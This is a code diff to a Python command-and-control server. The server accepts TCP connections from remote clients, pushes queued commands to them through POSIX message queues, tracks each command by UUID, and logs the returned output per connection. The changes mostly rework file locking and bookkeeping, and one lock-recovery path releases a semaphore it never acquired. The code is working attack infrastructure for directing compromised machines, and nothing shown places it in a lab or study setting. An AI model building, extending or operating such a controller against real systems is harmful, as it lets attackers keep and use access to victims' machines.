@@ -6,11 +6,14 @@ import time
 import json
 import threading
 import posix_ipc
+from c2.connection import init_connection, init_cmd_uuid_to_index_mapping
 
 
 base_dir = '/usr/src/app/c2/connections/'
 hello_log = '/hello_log'
 lock_name = '/connections_lock'
+cmd_metadata_separator = '----'
+semaphore_timeout = 30
 
 
 class InvalidConnUUID(Exception):
@@ -21,22 +24,40 @@ class NotAliveConnection(Exception):
     pass
 
 
+class InvalidSyncOperation(Exception):
+    pass
+
+
 class ConnectionStorage:
     def __init__(self):
+        self.connections = {}
+        self.reload()
+        self.semaphore = None
+
+    def reload(self):
         with open(os.path.join(base_dir, 'connections.json'), 'r') as f:
             self.connections = json.load(f)
 
-    def sync(self):
-        semaphore = posix_ipc.Semaphore(lock_name, flags=posix_ipc.O_CREAT, initial_value=1)
-        semaphore.acquire()
+    def start_sync(self):
+        self.semaphore = posix_ipc.Semaphore(lock_name, flags=posix_ipc.O_CREAT, initial_value=1)
+        try:
+            self.semaphore.acquire(timeout=semaphore_timeout)
+        except posix_ipc.BusyError:
+            # maybe the other thread crashed for some reason
+            self.semaphore.release()
+            # optimistically, now it should enter
+            self.semaphore.acquire()
         with open(os.path.join(base_dir, 'connections.json'), 'r') as f:
             saved_connections = json.load(f)
-        saved_connections.update(self.connections)
-        # synchronize with other instances
         self.connections.update(saved_connections)
+
+    def end_sync(self):
+        if self.semaphore is None:
+            raise InvalidSyncOperation
         with open(os.path.join(base_dir, 'connections.json'), 'w') as f:
-            json.dump(saved_connections, f, default=str)
-        semaphore.release()
+            json.dump(self.connections, f, default=str)
+        self.semaphore.release()
+        self.semaphore = None
 
 
 class C2TCPHandler(socketserver.BaseRequestHandler):
@@ -46,9 +67,9 @@ class C2TCPHandler(socketserver.BaseRequestHandler):
         conn_folder = base_dir + conn_uuid
         os.mkdir(conn_folder)
         mq = posix_ipc.MessageQueue(f'/{conn_uuid}', flags=posix_ipc.O_CREAT)
-        connectionStorage.connections[conn_uuid] = {'last_seen': time.time(), 'num_commands': 0,
-                                                    'is_alive': True, 'client_addr': self.client_address}
-        connectionStorage.sync()
+        connectionStorage.start_sync()
+        connectionStorage.connections[conn_uuid] = init_connection(time.time(), self.client_address)
+        connectionStorage.end_sync()
         log_file = conn_folder + hello_log
         # TODO: what to expect here as "hello", in general?
         hello = self.request.recv(6).strip()
@@ -57,9 +78,18 @@ class C2TCPHandler(socketserver.BaseRequestHandler):
         log_handler.close()
         close = False
         while not close:
-            command = mq.receive()[0]
-            # command = command.encode()
-            self.request.sendall(command + b'\n')
+            command = mq.receive()[0].split(cmd_metadata_separator.encode())
+            cmd_uuid, command = command[0].decode(), command[1]
+            connectionStorage.start_sync()
+            connectionStorage.connections[conn_uuid]['pending_cmd'] = True
+            connectionStorage.connections[conn_uuid]['cmd_uuid_to_index'][cmd_uuid] = \
+                init_cmd_uuid_to_index_mapping(connectionStorage.connections[conn_uuid]["num_commands"])
+            connectionStorage.end_sync()
+            # handling the case in which newline is not needed with MTU
+            if len(command) < 1460:
+                self.request.sendall(command + b'\n')
+            else:
+                self.request.sendall(command)
             log_file = conn_folder + f'/command_{connectionStorage.connections[conn_uuid]["num_commands"]}'
             log_handler = open(log_file, 'wb')
             log_handler.write(command + b'\n')
@@ -74,7 +104,9 @@ class C2TCPHandler(socketserver.BaseRequestHandler):
                         time.sleep(1)
                         data = self.request.recv(4096)
                         log_handler.write(data)
+                        connectionStorage.start_sync()
                         connectionStorage.connections[conn_uuid]['last_seen'] = time.time()
+                        connectionStorage.end_sync()
                         n_received += 1
                         # decrease timeout for the next receives
                         self.request.settimeout(2)
@@ -87,10 +119,14 @@ class C2TCPHandler(socketserver.BaseRequestHandler):
                             self.request.settimeout(original_timeout)
                         receiving = False
             log_handler.close()
+            connectionStorage.start_sync()
+            connectionStorage.connections[conn_uuid]['pending_cmd'] = False
+            connectionStorage.connections[conn_uuid]['cmd_uuid_to_index'][cmd_uuid]['pending'] = False
             connectionStorage.connections[conn_uuid]['num_commands'] += 1
-            connectionStorage.sync()
+            connectionStorage.end_sync()
+        connectionStorage.start_sync()
         connectionStorage.connections[conn_uuid]['is_alive'] = False
-        connectionStorage.sync()
+        connectionStorage.end_sync()
 
 
 def start_multithreaded_c2(config):
@@ -129,12 +165,18 @@ def send_c2_command(conn_uuid, command):
         raise InvalidConnUUID
     if not connections[conn_uuid]['is_alive']:
         raise NotAliveConnection
+    cmd_uuid = uuid.uuid4().hex
+    if isinstance(command, bytes):
+        command = cmd_uuid.encode() + cmd_metadata_separator.encode() + command
+    else:
+        command = f"{cmd_uuid}{cmd_metadata_separator}{command}"
     mq_name = f'/{conn_uuid}'
     mq = posix_ipc.MessageQueue(mq_name)
     mq.send(command)
+    return cmd_uuid
 
 
-def read_c2_log(conn_uuid, index=None):
+def read_c2_log(conn_uuid, index=None, decode=True):
     connectionStorage = ConnectionStorage()
     connections = connectionStorage.connections
     if conn_uuid not in connections:
@@ -157,5 +199,6 @@ def read_c2_log(conn_uuid, index=None):
                 data = f.read()
         except ValueError:
             return "Invalid index"
-    data = data.decode(errors='replace')
+    if decode:
+        data = data.decode(errors='replace')
     return data
